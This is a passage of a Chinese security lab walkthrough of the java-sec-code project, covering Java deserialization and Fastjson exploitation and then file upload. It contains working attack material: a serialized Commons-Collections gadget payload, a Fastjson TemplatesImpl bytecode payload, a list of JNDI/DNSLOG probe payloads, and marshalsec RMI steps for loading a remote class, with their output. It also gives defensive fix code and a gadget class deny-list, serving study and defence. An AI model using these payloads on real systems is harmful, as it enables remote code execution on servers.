nMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo&#x2F;2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEm9wZW4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg&#x3D;</span><br></pre></td></tr></table></figure>

<p>访问页面</p>
<p><a href="http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln">http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210926172201962.png" alt="image-20210926172201962"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)</span><br><span class="line">public String rememberMeBlackClassCheck(HttpServletRequest request)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">        return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; catch (InvalidClassException e) &#123;</span><br><span class="line">        logger.info(e.toString());</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;I&#39;m very OK.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复方式是通过Hook resolveClass来校验反序列化的类</p>
<blockquote>
<p>序列化数据结构可以了解到包含了类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。这个方法最早是由IBM的研究人员Pierre Ernst在2013年提出《<a href="https://www.ibm.com/developerworks/library/se-lookahead/">Look-ahead Java deserialization</a>》</p>
</blockquote>
<p>跟入后对应代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 只允许反序列化SerialObject class</span><br><span class="line"> *</span><br><span class="line"> * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。</span><br><span class="line"> * 类似fastjson通用类的反序列化就不能校验。</span><br><span class="line"> * 但是RASP是通过HOOK java&#x2F;io&#x2F;ObjectInputStream类的resolveClass方法，全局的检测白名单。</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">@Override</span><br><span class="line">protected Class&lt;?&gt; resolveClass(final ObjectStreamClass desc)</span><br><span class="line">        throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String className &#x3D; desc.getName();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject</span><br><span class="line">    logger.info(&quot;Deserialize class name: &quot; + className);</span><br><span class="line"></span><br><span class="line">    String[] denyClasses &#x3D; &#123;&quot;java.net.InetAddress&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.Transformer&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.functors&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    for (String denyClass : denyClasses) &#123;</span><br><span class="line">        if (className.startsWith(denyClass)) &#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return super.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果还是不太明白，可以参考：</p>
<ol>
<li><a href="https://xz.aliyun.com/t/41/">浅谈Java反序列化漏洞修复方案</a></li>
<li><a href="http://www.lmxspace.com/2019/11/20/Java反序列化过程深究/">Java反序列化过程深究</a></li>
</ol>
<h2 id="8-Fastjson"><a href="#8-Fastjson" class="headerlink" title="8.Fastjson"></a>8.Fastjson</h2><p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p>
<p>漏洞被利用本质找到一条有效的攻击链，攻击链的末端就是有代码执行能力的类，来达到我们想做的事情，一般都是用来RCE（远程命令执行）。构造一个触发器，也就是通过什么方式来让攻击链执行你想要的代码。触发器可以通过很多方式，比如静态代码块、构造方法等等。</p>
<p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p>
<p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；<br>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。<br>攻击者可以构造恶意请求，使目标应用的代码执行流程进入这部分特定setter或getter方法，若上述方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。官方采用了黑名单方式对反序列化类名校验，但随着时间的推移及自动化漏洞挖掘能力的提升。新Gadget会不断涌现，黑名单这种治标不治本的方式只会导致不断被绕过，从而对使用该组件的用户带来不断升级版本的困扰。</p>
<p>对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法：</p>
<p>parse (String text)</p>
<p>parseObject(String text)</p>
<p>parseObject(String text, Class clazz)</p>
<p>无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;deserialize&quot;, method &#x3D; &#123;RequestMethod.POST&#125;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String Deserialize(@RequestBody String params) &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果Content-Type不设置application&#x2F;json格式，post数据会被url编码</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 将post提交的string转换为json</span><br><span class="line">            JSONObject ob &#x3D; JSON.parseObject(params);</span><br><span class="line">            return ob.get(&quot;name&quot;).toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Open calc in mac</span><br><span class="line">        String payload &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk&#x2F;OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ&#x3D;&#x3D;\&quot;], \&quot;_name\&quot;: \&quot;lightless\&quot;, \&quot;_tfactory\&quot;: &#123; &#125;, \&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用parseObject 来解析json字符串</p>
<p>用POST方法打开，Content-Type设置为application/json，暴露使用的fastjson:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164036838.png" alt="image-20210927164036838"></p>
<h3 id="使用DNSLOG验证"><a href="#使用DNSLOG验证" class="headerlink" title="使用DNSLOG验证"></a>使用DNSLOG验证</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;asText&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;rmi:&#x2F;&#x2F;dnslog&#x2F;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164811478.png" alt="image-20210927164811478"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210927164834250.png" alt="image-20210927164834250"></p>
<h3 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>编译代码,上传至服务器，我在本地使用Python http.server 进行搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java          &#x2F;&#x2F;进行编译</span><br><span class="line">python3 -m http.server 4444   &#x2F;&#x2F;简单搭建web服务</span><br></pre></td></tr></table></figure>

<p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>

<p>在显示监听后，在客户端发送请求payload，主要看创建文件是否成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.169.8.103:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162052579.png" alt="image-20210928162052579"></p>
<p>发现已经访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;#TouchFile 9999</span><br><span class="line">* Opening JRMP listener on 9999</span><br><span class="line">Have connection from &#x2F;192.168.8.103:54177</span><br><span class="line">Reading message...</span><br><span class="line">Is RMI.lookup call for TouchFile 2</span><br><span class="line">Sending remote classloading stub targeting http:&#x2F;&#x2F;192.168.8.103:4444&#x2F;TouchFile.class</span><br><span class="line">Closing connection</span><br><span class="line"></span><br><span class="line">╰─$ python3 -m http.server 4444</span><br><span class="line">Serving HTTP on :: port 4444 (http:&#x2F;&#x2F;[::]:4444&#x2F;) ...</span><br><span class="line">::ffff:192.168.8.103 - - [28&#x2F;Sep&#x2F;2021 16:06:29] &quot;GET &#x2F;TouchFile.class HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>查看文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210928162106468.png" alt="image-20210928162106468"></p>
<ol>
<li><a href="https://paper.seebug.org/1274/">Fastjson 1.2.24 反序列化漏洞深度分析</a></li>
<li><a href="https://github.com/alibaba/fastjson/issues/3077">发现最新版本1.2.67依然可以通过dnslog判断正确是否使用fastjson</a></li>
</ol>
<h2 id="9-FileUpload"><a href="#9-FileUpload" class="headerlink" title="9.FileUpload"></a>9.FileUpload</h2><p>对于文件上传来说，目前这类漏洞在spring里非常少，原因有两点：</p>
<ol>
<li>大多数公司上传的文件都会到cdn</li>
<li>spring的jsp文件必须在web-inf目录下才能执行</li>
</ol>
<p>除非，可以上传war包到tomcat的webapps目录。</p>
<p>正常上传代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; file.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;status&quot;)</span><br><span class="line">public String uploadStatus() &#123;</span><br><span class="line">    return &quot;uploadStatus&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到没有对后缀名，MIME，文件内容等内容进行校验，可以任意上传。</p>
<p>对图片上传做限制后的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&#x2F;picture&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">        if (multifile.isEmpty()) &#123;</span><br><span class="line">            return &quot;Please select a file to upload&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String fileName &#x3D; multifile.getOriginalFilename();</span><br><span class="line">        String Suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F; 获取文件后缀名</span><br><span class="line">        String mimeType &#x3D; multifile.getContentType(); &#x2F;&#x2F; 获取MIME类型</span><br><span class="line">        String filePath &#x3D; UPLOADED_FOLDER + fileName;</span><br><span class="line">        File excelFile &#x3D; convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">        String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">        boolean suffixFlag &#x3D; false;</span><br><span class="line">        for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">                suffixFlag &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!suffixFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">        String[] mimeTypeBlackList &#x3D; &#123;</span><br><span class="line">                &quot;text&#x2F;html&quot;,</span><br><span class="line">                &quot;text&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;javascript&quot;,</span><br><span class="line">                &quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">                &quot;text&#x2F;xml&quot;,</span><br><span class="line">                &quot;application&#x2F;xml&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">            &#x2F;&#x2F; 用contains是为了防止text&#x2F;html;charset&#x3D;UTF-8绕过</span><br><span class="line">            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">                logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">                deleteFile(filePath);</span><br><span class="line">                return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断文件内容是否是图片 校验3</span><br><span class="line">        boolean isImageFlag &#x3D; isImage(excelFile);</span><br><span class="line">        deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">        if (!isImageFlag) &#123;</span><br><span class="line">            logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">            byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">            Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteFile(String filePath) &#123;</span><br><span class="line">        File delFile &#x3D; new File(filePath);</span><br><span class="line">        if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">            if (delFile.delete()) &#123;</span><br><span class="line">                logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">                return;</span><br><span 